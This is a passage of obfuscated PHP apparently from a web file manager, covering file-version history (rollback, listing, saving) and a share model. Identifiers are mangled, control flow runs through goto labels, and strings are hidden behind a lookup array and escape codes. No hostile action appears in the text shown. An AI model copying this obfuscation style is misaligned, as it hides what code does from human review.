get_path_this($c¶¢◊¬üÒÍ); $DÂÉÉñ·ŒÆ = $DÂÉÉñ·ŒÆ ? $DÂÉÉñ·ŒÆ : $bú©Çòπô±[$b…èøÓ≠éõ[1158]]; goto Aí©“√≈ÂŒ; Aí©“√≈ÂŒ: $eâü‹†êò∆ = substr(get_path_this($bú©Çòπô±[$b…èøÓ≠éõ[1159]]), 0, -strlen($b›ÓãÒ±≈Á)); foreach ($bú©Çòπô±[$b…èøÓ≠éõ[367]] as $b¥ï∏øı€é => $dÛ·≠Ìè≠Œ) { $EîâŸΩ´ÑÕ = $D·®£õÇ∆ﬂ . substr($dÛ·≠Ìè≠Œ[$b…èøÓ≠éõ[28]], strlen($eâü‹†êò∆)); $dˆÇ¢øı›¯ = IO::move($bú©Çòπô±[$b…èøÓ≠éõ[1158]] . $dÛ·≠Ìè≠Œ[$b…èøÓ≠éõ[28]], $DÂÉÉñ·ŒÆ, !1, $EîâŸΩ´ÑÕ); if ($dˆÇ¢øı›¯) { $bú©Çòπô±[$b…èøÓ≠éõ[367]][$b¥ï∏øı€é][$b…èøÓ≠éõ[28]] = $EîâŸΩ´ÑÕ; } } $bú©Çòπô±[$b…èøÓ≠éõ[1159]] = IO::move($bú©Çòπô±[$b…èøÓ≠éõ[1159]], $DÂÉÉñ·ŒÆ, !1, $D·®£õÇ∆ﬂ . $b›ÓãÒ±≈Á); goto eË∑œ”çÍœ; AŸÓñŸ…√î: $b…èøÓ≠éõ =& $_SERVER[’ÿƒ†ïò]; $bú©Çòπô± = self::listData($c¶¢◊¬üÒÍ, !1); if (!$bú©Çòπô± || !$bú©Çòπô±[$b…èøÓ≠éõ[367]]) { return !1; } goto E‹ì°å‚≥‰; eË∑œ”çÍœ: self::saveData($bú©Çòπô±[$b…èøÓ≠éõ[1159]], $bú©Çòπô±[$b…èøÓ≠éõ[367]]); self::clearEmptyFolder($bú©Çòπô±[$b…èøÓ≠éõ[1158]]); goto eîÁŸçŸÈ®; eîÁŸçŸÈ®: } public static function rollback($cè≠€£Ü¡ã, $C¢√“ÙëéÔ) { $D‹·ÑßòÖ∂ =& $_SERVER[’ÿƒ†ïò]; $Dä·±Ü∏ä¬ = self::listData($cè≠€£Ü¡ã); if (!$Dä·±Ü∏ä¬) { return; } $Eﬁ‹¬ùîﬁò = IO::info($cè≠€£Ü¡ã); foreach ($Dä·±Ü∏ä¬[$D‹·ÑßòÖ∂[367]] as $eÚ¿¡È–æã => $F®ÑäﬁÔò“) { if ($F®ÑäﬁÔò“[$D‹·ÑßòÖ∂[395]] == $C¢√“ÙëéÔ) { self::add($cè≠€£Ü¡ã); $c≥í˜ê„ÔÊ = $Dä·±Ü∏ä¬[$D‹·ÑßòÖ∂[1158]] . $F®ÑäﬁÔò“[$D‹·ÑßòÖ∂[28]]; $A◊§ˆ≤Ôõ® = IO::copy($c≥í˜ê„ÔÊ, IO::pathFather($cè≠€£Ü¡ã), REPEAT_REPLACE, $Eﬁ‹¬ùîﬁò[$D‹·ÑßòÖ∂[28]]); if ($A◊§ˆ≤Ôõ®) { self::remove($cè≠€£Ü¡ã, $C¢√“ÙëéÔ); } return $A◊§ˆ≤Ôõ®; } } return !1; } public static function setDetail($a€ΩÊêÛ∫, $B¡÷πØπ¶Î, $C•õÔÚ„©≤) { $C√≥’⁄´†Â =& $_SERVER[’ÿƒ†ïò]; $CµÓÇÆŒì¨ = self::listData($a€ΩÊêÛ∫); if (!$CµÓÇÆŒì¨) { return; } foreach ($CµÓÇÆŒì¨[$C√≥’⁄´†Â[367]] as $dˆöØ˘⁄π» => $E⁄çŸ¯áÕ¯) { if ($E⁄çŸ¯áÕ¯[$C√≥’⁄´†Â[395]] == $B¡÷πØπ¶Î) { $CµÓÇÆŒì¨[$C√≥’⁄´†Â[367]][$dˆöØ˘⁄π»][$C√≥’⁄´†Â[1157]] = $C•õÔÚ„©≤; self::saveData($CµÓÇÆŒì¨[$C√≥’⁄´†Â[1159]], $CµÓÇÆŒì¨[$C√≥’⁄´†Â[367]]); return !0; } } return !1; } public static function fileInfo($AâÛâ±ã®¬, $bÒìà™êóõ) { goto E±÷Ëëá™ñ; E±÷Ëëá™ñ: $cÊèÁ√÷è∆ =& $_SERVER[’ÿƒ†ïò]; $DïëáÓ•—∑ = self::listData($AâÛâ±ã®¬); if (!$DïëáÓ•—∑) { show_json(LNG($cÊèÁ√÷è∆[105]), !1); } goto dè´πù∫ÖÛ; dè´πù∫ÖÛ: $Bß∆ß„ö›á = $cÊèÁ√÷è∆[33]; foreach ($DïëáÓ•—∑[$cÊèÁ√÷è∆[367]] as $Aœ£©’√›◊ => $d¡âê¬ôÉ‹) { if ($d¡âê¬ôÉ‹[$cÊèÁ√÷è∆[395]] != $bÒìà™êóõ) { continue; } $Bß∆ß„ö›á = $DïëáÓ•—∑[$cÊèÁ√÷è∆[1158]] . $d¡âê¬ôÉ‹[$cÊèÁ√÷è∆[28]]; break; } if (!$Bß∆ß„ö›á) { show_json(LNG($cÊèÁ√÷è∆[105]), !1); } goto bö«ÂØ–ßÊ; bö«ÂØ–ßÊ: return IO::info($Bß∆ß„ö›á); goto cÁÂáÇØô€; cÁÂáÇØô€: } public static function fileOut($E∞öùååßÑ, $BÉ¢Íò≈éµ, $E‹∂æ¿à‘“ = false) { $cÇ° Ãı∞… =& $_SERVER[’ÿƒ†ïò]; $b∫Öá‡”ûı = self::fileInfo($E∞öùååßÑ, $BÉ¢Íò≈éµ); $EËÓ¨è∫„ö =& $GLOBALS[$cÇ° Ãı∞…[7]]; $E‹∂æ¿à‘“ = isset($EËÓ¨è∫„ö[$cÇ° Ãı∞…[1122]]) && $EËÓ¨è∫„ö[$cÇ° Ãı∞…[1122]] == 1; if (isset($EËÓ¨è∫„ö[$cÇ° Ãı∞…[29]]) && $EËÓ¨è∫„ö[$cÇ° Ãı∞…[29]] == $cÇ° Ãı∞…[1160]) { return IO::fileOutImage($b∫Öá‡”ûı[$cÇ° Ãı∞…[76]], $EËÓ¨è∫„ö[$cÇ° Ãı∞…[1161]]); } IO::fileOut($b∫Öá‡”ûı[$cÇ° Ãı∞…[76]], $E‹∂æ¿à‘“, get_path_this($E∞öùååßÑ)); } public static function listData($FªƒÑ⁄„§Ô, $B÷Ó≠åôµ» = true) { goto bêÖ‡ê“‡; A∂¥öµ≥Îë: $E˜≤«‘›Ç° = IO::getContent($dèÚ∑âáÑ§[$aÒ•◊†ˆ∞©[1159]]); if ($E˜≤«‘›Ç°) { $eº÷Îõ’¬ø = json_decode($E˜≤«‘›Ç°, !0); if (is_array($eº÷Îõ’¬ø)) { $dèÚ∑âáÑ§[$aÒ•◊†ˆ∞©[367]] = $eº÷Îõ’¬ø; } } return $dèÚ∑âáÑ§; goto C“∆≈ÖÜúÒ; A·‚Ì˘©ﬂó: if (substr($FªƒÑ⁄„§Ô, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $EÈÈô¶ìâÖ = self::pathHistory($FªƒÑ⁄„§Ô); $dèÚ∑âáÑ§ = array($aÒ•◊†ˆ∞©[1159] => $EÈÈô¶ìâÖ . $aÒ•◊†ˆ∞©[1146], $aÒ•◊†ˆ∞©[1158] => rtrim(get_path_father($EÈÈô¶ìâÖ), $aÒ•◊†ˆ∞©[8]) . $aÒ•◊†ˆ∞©[8], $aÒ•◊†ˆ∞©[367] => array()); goto A∂¥öµ≥Îë; bêÖ‡ê“‡: $aÒ•◊†ˆ∞© =& $_SERVER[’ÿƒ†ïò]; if ($B÷Ó≠åôµ» && !IO::exist($FªƒÑ⁄„§Ô)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto A·‚Ì˘©ﬂó; C“∆≈ÖÜúÒ: } private static function saveData($A∞ú§∫¢©’, $eì†√ß˜¢ﬁ) { goto Aó™˜∆¢Ÿâ; Aó™˜∆¢Ÿâ: $F∏æﬂÂàä† =& $_SERVER[’ÿƒ†ïò]; self::log($F∏æﬂÂàä†[1162] . $A∞ú§∫¢©’ . $F∏æﬂÂàä†[68] . count($eì†√ß˜¢ﬁ), $F∏æﬂÂàä†[740]); if ($eì†√ß˜¢ﬁ) { return IO::setContent($A∞ú§∫¢©’, json_encode($eì†√ß˜¢ﬁ)); } goto aÒë∫í≤óÎ; cäû§ãÎñ˘: return !0; goto dŸ”ë›Ç˘¿; aÒë∫í≤óÎ: $E»ìÁôà±Ö = IO::pathFather($A∞ú§∫¢©’); IO::remove($A∞ú§∫¢©’); self::clearEmptyFolder($E»ìÁôà±Ö); goto cäû§ãÎñ˘; dŸ”ë›Ç˘¿: } public static function clearEmptyFolder($bßâè√Øåá) { goto b˜ƒµπëÃ¬; A£∏äå¶ãı: self::clearEmptyFolder($då¥—⁄Éç”); goto E⁄≤ú®À¨’; Bë√ÿÆèê∑: $Fö≤‹ç∫≠ = IO::has($bßâè√Øåá, !0); if ($Fö≤‹ç∫≠[$bïœßˆÁ√é[203]] > 0 || $Fö≤‹ç∫≠[$bïœßˆÁ√é[204]] > 0) { return; } IO::remove($bßâè√Øåá); goto A£∏äå¶ãı; b˜ƒµπëÃ¬: $bïœßˆÁ√é =& $_SERVER[’ÿƒ†ïò]; if (trim($bßâè√Øåá, $bïœßˆÁ√é[8]) == trim(self::$_historyBase, $bïœßˆÁ√é[8])) { return; } $då¥—⁄Éç” = IO::pathFather($bßâè√Øåá); goto Bë√ÿÆèê∑; E⁄≤ú®À¨’: } private static function getBasePath() { goto Fñ˜áöâÉ∞; dÆ÷≈è§éˆ: $C‚ﬁ§ŸÒΩË = DATA_PATH . $b™¿õ∞§òÜ[1165] . rand_string(8) . $b™¿õ∞§òÜ[8]; $C‚ﬁ§ŸÒΩË = IO::mkdir($C‚ﬁ§ŸÒΩË); $C‚ﬁ§ŸÒΩË = rtrim($C‚ﬁ§ŸÒΩË, $b™¿õ∞§òÜ[8]) . $b™¿õ∞§òÜ[8]; goto bñäÛç›ªÖ; Fñ˜áöâÉ∞: $b™¿õ∞§òÜ =& $_SERVER[’ÿƒ†ïò]; $C‚ﬁ§ŸÒΩË = Model($b™¿õ∞§òÜ[1163])->get($b™¿õ∞§òÜ[1164]); if ($C‚ﬁ§ŸÒΩË) { if (!IO::exist($C‚ﬁ§ŸÒΩË)) { IO::mkdir($C‚ﬁ§ŸÒΩË); } if (get_path_this($C‚ﬁ§ŸÒΩË) == $b™¿õ∞§òÜ[1149]) { $AﬁªøËâ∏Ü = $b™¿õ∞§òÜ[1165] . rand_string(8); @rename($C‚ﬁ§ŸÒΩË, get_path_father($C‚ﬁ§ŸÒΩË) . $b™¿õ∞§òÜ[8] . $AﬁªøËâ∏Ü); $C‚ﬁ§ŸÒΩË = DATA_PATH . $AﬁªøËâ∏Ü . $b™¿õ∞§òÜ[8]; file_put_contents(DATA_PATH . $b™¿õ∞§òÜ[1166], $b™¿õ∞§òÜ[33]); Model($b™¿õ∞§òÜ[1163])->set($b™¿õ∞§òÜ[1164], $C‚ﬁ§ŸÒΩË); } return $C‚ﬁ§ŸÒΩË; } goto dÆ÷≈è§éˆ; bñäÛç›ªÖ: file_put_contents($C‚ﬁ§ŸÒΩË . $b™¿õ∞§òÜ[1166], $b™¿õ∞§òÜ[33]); file_put_contents(DATA_PATH . $b™¿õ∞§òÜ[1166], $b™¿õ∞§òÜ[33]); Model($b™¿õ∞§òÜ[1163])->set($b™¿õ∞§òÜ[1164], $C‚ﬁ§ŸÒΩË); goto EÎΩ‹˜Á€‡; EÎΩ‹˜Á€‡: return $C‚ﬁ§ŸÒΩË; goto f÷•‚Ø˘ñó; f÷•‚Ø˘ñó: } } goto eåàù«‰È√; b⁄¯óß≈ŒÓ: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\x69\155\145", "\164\151\x6d\x65", "\x69\156\x73\145\x72\164\x2c\165\160\x64\141\x74\145", "\x66\x75\156\x63\x74\151\157\156"), array("\143\x72\145\141\x74\x65\x54\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\164\x69\157\x6e"), array("\157\x70\x74\151\157\x6e\x73", '', "\x69\156\x73\145\x72\164\54\165\160\144\x61\x74\x65\x2c\163\x65\x6c\145\x63\164", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($fﬁÈ◊Í∏Ìú) { $Dƒ˜ªÛ«£ß =& $_SERVER[’ÿƒ†ïò]; $dÇà⁄§ÉÉ£ = isset($fﬁÈ◊Í∏Ìú[0]) ? $fﬁÈ◊Í∏Ìú[0] : !1; return array($Dƒ˜ªÛ«£ß[1859] => array(USER_ID, $Dƒ˜ªÛ«£ß[1860]), $Dƒ˜ªÛ«£ß[1802] => array($dÇà⁄§ÉÉ£, $Dƒ˜ªÛ«£ß[1861])); } protected function listSimple() { $AœÖÃÖﬂ’ƒ = array($_SERVER[’ÿƒ†ïò][1557] => USER_ID); $BﬁÙ…€Íı‡ = $this->field($this->fieldList)->where($AœÖÃÖﬂ’ƒ)->select(); return $BﬁÙ…€Íı‡ ? $BﬁÙ…€Íı‡ : array(); } protected function getInfo($CØÁ˜ßçô¬, $e¢ªí¡àˆ“ = false) { $e±´©¯Í¡ =& $_SERVER[’ÿƒ†ïò]; if ($e¢ªí¡àˆ“) { return $this->_getShareInfo(array($e±´©¯Í¡[482] => $CØÁ˜ßçô¬)); } $fæÑΩ´ëöë = $this->cacheFunctionGet($e±´©¯Í¡[1804], $CØÁ˜ßçô¬); return $fæÑΩ´ëöë; } public function getInfoByHash($d˜ìƒåÁÌÛ) { return $this->_getShareInfo(array($_SERVER[’ÿƒ†ïò][484] => $d˜ìƒåÁÌÛ)); } public function getInfoByPath($AÉ∞“¥ì£±) { $aÚ¬ùá˜Àî =& $_SERVER[’ÿƒ†ïò]; $F˘¿¨√·∞æ = array($aÚ¬ùá˜Àî[1557] => USER_ID, $aÚ¬ùá˜Àî[397] => $AÉ∞“¥ì£±); return $this->_getShareInfo($F˘¿¨√·∞æ); } public function getInfoBySourcePath($e¿ü“©õìî) { $bŸÚØÌõØ∑ =& $_SERVER[’ÿƒ†ïò]; $f¨¯Û†∞ıÃ = array($bŸÚØÌõØ∑[1557] => USER_ID, $bŸÚØÌõØ∑[1099] => $e¿ü“©õìî); return $this->_getShareInfo($f¨¯Û†∞ıÃ); } private function _getShareInfo($fñë∂œ¡∂Ÿ) { goto fÔôüäÉﬂŒ; FÒÒ”œ“Ï: $fñë∂œ¡∂Ÿ = array($cﬂÆÈ»áàÍ[482] => $Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[482]]); $fõ∏‘–ëúÕ = $cﬂÆÈ»áàÍ[1862]; $C·»Â⁄ıìë = Model($cﬂÆÈ»áàÍ[590])->order($cﬂÆÈ»áàÍ[395])->field($fõ∏‘–ëúÕ)->where($fñë∂œ¡∂Ÿ)->select(); goto DªÇç÷øÑ≤; DªÇç÷øÑ≤: if ($Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[397]] == $cﬂÆÈ»áàÍ[191]) { $Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[85]] = IO::info($Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[1099]]); } else { $Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[85]] = Model($cﬂÆÈ»áàÍ[1234])->pathInfo($Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[397]]); } $Aèá£áÜåÏ[$cﬂÆÈ»áàÍ[1863]] = $C·»Â⁄ıìë; return $Aèá£áÜåÏ; goto E·‹⁄ËÕ€ ; fÔôüäÉﬂŒ: $cﬂÆÈ»áàÍ =& $_SERVER[’ÿƒ†ïò]; $Aèá£áÜåÏ = $this->where($fñë∂œ¡∂Ÿ)->find(); if (!$Aèá£áÜåÏ) { return !1; } goto FÒÒ”œ“Ï; E·‹⁄ËÕ€ : } protected function getInfoAuth($F…∂∫Øé◊ú) { $AÀéı’€Ê =& $_SERVER[’ÿƒ†ïò]; $cæä©Ç§ÛÌ = $this->getInfo($F…∂∫Øé◊ú); $cæä©Ç§ÛÌ[$AÀéı’€Ê[408]] = Model($AÀéı’€Ê[496])->authMake($cæä©Ç§ÛÌ[$AÀéı’€Ê[1863]]); return $cæä©Ç§ÛÌ; } protected function listData($D’Êª›ïØ⁄ = null, $C⁄ÿÜóèÉ⁄ = 300) { $b∏§¬„¿Ò =& $_SERVER[’ÿƒ†ïò]; $F·ß¡ ‹Ï– = array(array($b∏§¬„¿Ò[487] => array($b∏§¬„¿Ò[999], 0), $b∏§¬„¿Ò[489] => array($b∏§¬„¿Ò[999], 0), $b∏§¬„¿Ò[1864] => $b∏§¬„¿Ò[1818])); if ($D’Êª›ïØ⁄ == $b∏§¬„¿Ò[1865]) { $F·ß¡ ‹Ï– = array($b∏§¬„¿Ò[487] => 1); } else { if ($D’Êª›ïØ⁄ == $b∏§¬„¿Ò[1084]) { $F·ß¡ ‹Ï– = array($b∏§¬„¿Ò[489] => 1); } } $F·ß¡ ‹Ï–[$b∏§¬„¿Ò[1557]] = USER_ID; $cªÜô´∏Ê¬ = $this->where($F·ß¡ ‹Ï–)->selectPage($C⁄ÿÜóèÉ⁄); return $cªÜô´∏Ê¬; } protected function listToMe($b»«È¯Œ°Ù = 300) { goto DÃŸëû›Âï; DÃŸëû›Âï: $d€‚òËÓ€† =& $_SERVER[’ÿƒ†ïò]; $a—“©Ç™Ë£ = Model($d€‚òËÓ€†[1866])->userGroupParents(USER_ID); $FÁ‚Õ„€ŸŒ = array($d€‚òËÓ€†[574] => SourceModel::TYPE_USER, $d€‚òËÓ€†[498] => USER_ID); goto A‹§©–úøΩ; A‹§©–úøΩ: if ($a—“©Ç™Ë£) { $FÁ‚Õ„€ŸŒ = array(array($d€‚òËÓ€†[574] => SourceModel::TYPE_USER, $d€‚òËÓ€†[498] => USER_ID), array($d€‚òËÓ€†[574] => SourceModel::TYPE_GROUP, $d€‚òËÓ€†[498] => array($d€‚òËÓ€†[7], $a—“©Ç™Ë£)), $d€‚òËÓ€†[1864] => $d€‚òËÓ€†[1818]); } $d⁄˘∑°ÌŒ´ = Model($d€‚òËÓ€†[590])->where($FÁ‚Õ„€ŸŒ)->selectPage($b»«È¯Œ°Ù); $EÜÿËö⁄ÿ£ = array_to_keyvalue_group($d⁄˘∑°ÌŒ´[$d€‚òËÓ€†[367]], $d€‚òËÓ€†[482]); goto C´ÿµòè≥é; C©ó‘ò¯Âø: $aõÔìâ°û» = array($d€‚òËÓ€†[1868] => $E‡£ÉÇÎó◊, $d€‚òËÓ€†[1869] => $d⁄˘∑°ÌŒ´[$d€‚òËÓ€†[364]]); return $aõÔìâ°û»; goto bçë„Íúπƒ; C´ÿµòè≥é: if (!$EÜÿËö⁄ÿ£) { return $d⁄˘∑°ÌŒ´; } $Búüù≠ÚÏ› = $d€‚òËÓ€†[1867]; $FÁ‚Õ„€ŸŒ = array($d€‚òËÓ€†[482] => array($d€‚òËÓ€†[413], array_keys($EÜÿËö⁄ÿ£)), $d€‚òËÓ€†[1557] => array($d€‚òËÓ€†[1001], $d€‚òËÓ€†[191])); goto aø¶£ıÃï; aø¶£ıÃï: $E‡£ÉÇÎó◊ = $this->field($Búüù≠ÚÏ›)->where($FÁ‚Õ„€ŸŒ)->select(); foreach ($E‡£ÉÇÎó◊ as $f™”º—ùÕã => &$aâ›Ãë‡’„) { $aâ›Ãë‡’„[$d€‚òËÓ€†[1863]] = $EÜÿËö⁄ÿ£[$aâ›Ãë‡’„[$d€‚òËÓ€†[482]]]; } unset($aâ›Ãë‡’„); goto C©ó‘ò¯Âø; bçë„Íúπƒ: } protected function shareAdd($bóÁ∑ì≤î…, $eÚ√≤®Ñ£¢) { $f œÁ≥â∫≈ =& $_SERVER[’ÿƒ†ïò]; $b¥ØÊè–„“ = $this->_addShareData($bóÁ∑ì≤î…, $eÚ√≤®Ñ£¢); if (!empty($eÚ√≤®Ñ£¢[$f œÁ≥â∫≈[1870]])) { $this->_shareAuthSet($b¥ØÊè–„“, $eÚ√≤®Ñ£¢[$f œÁ≥â∫≈[1870]]); } $this->shareEventAdd($bóÁ∑ì≤î…, $eÚ√≤®Ñ£¢, $f œÁ≥â∫≈[1087]); return $b¥ØÊè–„“; } protected function shareAddSystem($dàÎ©˘„¨¿, $bÓ–Öå≠¶ç) { $e“Õ€§óåÎ =& $_SERVER[’ÿƒ†ïò]; $f„‹áºîÛ™ = $this->_addShareData($dàÎ©˘„¨¿, $bÓ–Öå≠¶ç, $e“Õ€§óåÎ[1199]); $this->_shareAuthSet($f„‹áºîÛ™, $bÓ–Öå≠¶ç[$e“Õ€§óåÎ[1870]]); return $f„‹áºîÛ™; } private function shareEventAdd($EÓπÖ·≈Œ≤, $Dõ◊Ÿ¶—‚ç, $AèôÖëèæ∏ = "\x61\144\x64") { goto aê≈æµ´òê; c®æ‡Ò«∆è: if ($fÍçø‰å’¿[$F«à√¨≈ÇÚ[487]] == $F«à√¨≈ÇÚ[87] && $Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[487]] == $F«à√¨≈ÇÚ[191]) { $eÙﬁÇ‰ﬁëÛ = $F«à√¨≈ÇÚ[1874]; } if ($fÍçø‰å’¿[$F«à√¨≈ÇÚ[489]] == $F«à√¨≈ÇÚ[191] && $Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[489]] == $F«à√¨≈ÇÚ[87]) { $eÙﬁÇ‰ﬁëÛ = $F«à√¨≈ÇÚ[1872]; } if ($fÍçø‰å’¿[$F«à√¨≈ÇÚ[489]] == $F«à√¨≈ÇÚ[87] && $Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[489]] == $F«à√¨≈ÇÚ[191]) { $eÙﬁÇ‰ﬁëÛ = $F«à√¨≈ÇÚ[1875]; } goto f€»›”πå¨; Cÿ≠ÜÆ”©‡: $fÍçø‰å’¿ = $this->getInfoByPath($EÓπÖ·≈Œ≤); $eÙﬁÇ‰ﬁëÛ = $F«à√¨≈ÇÚ[1873]; if ($fÍçø‰å’¿[$F«à√¨≈ÇÚ[487]] == $F«à√¨≈ÇÚ[191] && $Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[487]] == $F«à√¨≈ÇÚ[87]) { $eÙﬁÇ‰ﬁëÛ = $F«à√¨≈ÇÚ[1871]; } goto c®æ‡Ò«∆è; aê≈æµ´òê: $F«à√¨≈ÇÚ =& $_SERVER[’ÿƒ†ïò]; if (!$EÓπÖ·≈Œ≤ || $EÓπÖ·≈Œ≤ == $F«à√¨≈ÇÚ[191]) { return; } if ($AèôÖëèæ∏ == $F«à√¨≈ÇÚ[1087]) { if ($Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[487]] == $F«à√¨≈ÇÚ[87]) { Model($F«à√¨≈ÇÚ[558])->eventShare($EÓπÖ·≈Œ≤, $F«à√¨≈ÇÚ[1871]); } if ($Dõ◊Ÿ¶—‚ç[$F«à√¨≈ÇÚ[489]] == $F«à√¨≈ÇÚ[87]) { Model($F«à√¨≈ÇÚ[558])->eventShare($EÓπÖ·≈Œ≤, $F«à√¨≈ÇÚ[1872]); } return; } goto Cÿ≠ÜÆ”©‡; f€»›”πå¨: Model($F«à√¨≈ÇÚ[558])->eventShare($EÓπÖ·≈Œ≤, $eÙﬁÇ‰ﬁëÛ); return; goto bØ£ÏéÜ¡◊; bØ£ÏéÜ¡◊: } private function _addShareData($aÏÙŒ¯æˆÜ, $fè¬ÒﬂÑÕØ = array(), $D°éÙ‘ƒÀ¥ = false) { goto a∑É≈πËΩ≠; CÃÌ§ÔŸ©í: if (!$fè¬ÒﬂÑÕØ[$eÏìÍõ…ä∏[1460]]) { $fè¬ÒﬂÑÕØ[$eÏìÍõ…ä∏[1460]] = $bŸêÂò¨Æà[$eÏìÍõ…ä∏[28]]; } $CπüøÑÁçú = array($eÏìÍõ…ä∏[1548] => $b¿Õƒæ™Ïå, $eÏìÍõ…ä∏[412] => $aÏÙŒ¯æˆÜ, $eÏìÍõ…ä∏[1460] => $eÏìÍõ…ä∏[33], $eÏìÍõ…ä∏[487] => 0, $eÏìÍõ…ä∏[489] => 0, $eÏìÍõ…ä∏[1099] => $eÏìÍõ…ä∏[33], $eÏìÍõ…ä∏[305] => $eÏìÍõ…ä∏[33], $eÏìÍõ…ä∏[879] => $eÏìÍõ…ä∏[33], $eÏìÍõ…ä∏[1877] => 0, $eÏìÍõ…ä∏[1878] => 0, $eÏìÍõ…ä∏[490] => 0, $eÏìÍõ…ä∏[491] => $eÏìÍõ…ä∏[33], $eÏìÍõ…ä∏[484] => $eÏìÍõ…ä∏[33]); $Cƒ«Ë˜ÿ˘◊ = explode($eÏìÍõ…ä∏[47], $eÏìÍõ…ä∏[1879]); goto f√”¥ã”∑Î; Aõƒäúä—ñ: if ($aÏÙŒ¯æˆÜ == 0) { $Eëﬂå◊áÏ† = array($eÏìÍõ…ä∏[1876] => $fè¬ÒﬂÑÕØ[$eÏìÍõ…ä∏[1099]], $eÏìÍõ…ä∏[1548] => $b¿Õƒæ™Ïå); } if ($F≤¥ñ¥ñè… = $this->where($Eëﬂå◊áÏ†)->find()) { return $F≤¥ñ¥ñè…[$eÏìÍõ…ä∏[482]]; } if ($aÏÙŒ¯æˆÜ == 0) { $bŸêÂò¨Æà = array($eÏìÍõ…ä∏[28] => get_path_this($fè¬ÒﬂÑÕØ[$eÏìÍõ…ä∏[76]])); } else { $bŸêÂò¨Æà = Model($eÏìÍõ…ä∏[820])->sourceInfo($aÏÙŒ¯æˆÜ); if (!$bŸêÂò¨Æà) { return !1; } } goto CÃÌ§ÔŸ©í; f√”¥ã”∑Î: foreach ($Cƒ«Ë˜ÿ˘◊ as $B¢ÖûÀ„¨∆) { if (!isset($fè¬ÒﬂÑÕØ[$B¢ÖûÀ„¨∆])) { continue; } $CπüøÑÁçú[$B¢ÖûÀ„¨∆] = $fè¬ÒﬂÑÕØ[$B¢ÖûÀ„¨∆]; } $cÀ◊ïñ˜Ó≥ = $this->add($CπüøÑÁçú); $eÌó¡πï∞€ = array($eÏìÍõ…ä∏[484] => short_id($cÀ◊ïñ˜Ó≥)); goto b”É‹Ñ‡œ; b”É‹Ñ‡œ: $this->where(array($eÏìÍõ…ä∏[481] => $cÀ◊ïñ˜Ó≥))->save($eÌó¡πï∞€); return $cÀ◊ïñ˜Ó≥; goto a∑ƒí¯ﬂõÊ; a∑É≈πËΩ≠: $eÏìÍõ…ä∏ =& $_SERVER[’ÿƒ†ïò]; $b¿Õƒæ™Ïå = $D°éÙ‘ƒÀ¥ == $eÏìÍõ…ä∏[1199] ? 0 : USER_ID; $Eëﬂå◊áÏ† = array($eÏìÍõ…ä∏[412] => $aÏÙŒ¯æˆÜ, $eÏìÍõ…ä∏[1548] => $b¿Õƒæ™Ïå); goto Aõƒäúä—ñ; a∑ƒí¯ﬂõÊ: } private function _shareAuthSet($Aå§√‘ﬁ¡Ò, $Eºìƒ¡Ó∫Ú) { goto dŒß—çØÂı; dŒß—çØÂı: $FŸπßÓµ–∏ =& $_SERVER[’ÿƒ†ïò]; if (!is_array($Eºìƒ¡Ó∫Ú)) { return !1; } $E¬∏òè·–Û = Model($FŸπßÓµ–∏[1830]); goto CäÃÃÑÎ»•; CäÃÃÑÎ»•: $E¬∏òè·–Û->where(array($FŸπßÓµ–∏[482] => $Aå§√‘ﬁ¡Ò))->delete(); $dÔËìò∑—ä = array(); foreach ($Eºìƒ¡Ó∫Ú as $b±à„«éñÈ) { $Aºå›∞Ì™◊ = SourceModel::TYPE_USER; if ($b±à„«éñÈ[$FŸπßÓµ–∏[406]] == SourceModel::TYPE_GROUP) { $Aºå›∞Ì™◊ = SourceModel::TYPE_GROUP; } $bÁ«≈ÍÚÙ¥ = array($FŸπßÓµ–∏[482] => $Aå§√‘ﬁ¡Ò, $FŸπßÓµ–∏[406] => $Aºå›∞Ì™◊, $FŸπßÓµ–∏[498] => intval($b±à„«éñÈ[$FŸπßÓµ–∏[498]]), $FŸπßÓµ–∏[1826] => 0, $FŸπßÓµ–∏[1880] => -1); if ($b±à„«éñÈ[$FŸπßÓµ–∏[1826]]) { $bÁ«≈ÍÚÙ¥[$FŸπßÓµ–∏[1826]] = $b±à„«éñÈ[$FŸπßÓµ–∏[1826]]; } else { if ($b±à„«éñÈ[$FŸπßÓµ–∏[1880]]) { $bÁ«≈ÍÚÙ¥[$FŸπßÓµ–∏[1880]] = $b±à„«éñÈ[$FŸπßÓµ–∏[1880]]; } } $dÔËìò∑—ä[] = $bÁ«≈ÍÚÙ¥; } goto bà∆…®îâ≈; bà∆…®îâ≈: return $E¬∏òè·–Û->addAll($dÔËìò∑—ä, array(), !0); goto Eéèã≈óÑÚ; Eéèã≈óÑÚ: } public function numViewAdd($aî∑ ÍÔõ) { $e´∑≈«·ˆº =& $_SERVER[’ÿƒ†ïò]; $b√πÖΩÉÚ¯ = array($e´∑≈«·ˆº[481] => $aî∑ ÍÔõ); $this->where($b√πÖΩÉÚ¯)->setAdd($e´∑≈«·ˆº[1877]); } public function numDownloadAdd($aÓ¨≥·ÜÈÚ) { $DÂ©¢æïïØ =& $_SERVER[’ÿƒ†ïò]; $D›†ŸèëÆö = array($DÂ©¢æïïØ[481] => $aÓ¨≥·ÜÈÚ); $this->where($D›†ŸèëÆö)->setAdd($DÂ©¢æïïØ[1878]); } protected function shareEdit($A‰¨ÒÀÍäõ, $DÈ—Ç÷´…ã) { goto b¢¯£±è†≠; b¢¯£±è†≠: $aÁ÷ÿÒ¡¨¡ =& $_SERVER[’ÿƒ†ïò]; $CÖÜñ∑äÒå = $this->getInfo($A‰¨ÒÀÍäõ); if (!$CÖÜñ∑äÒå) { return !1; } goto 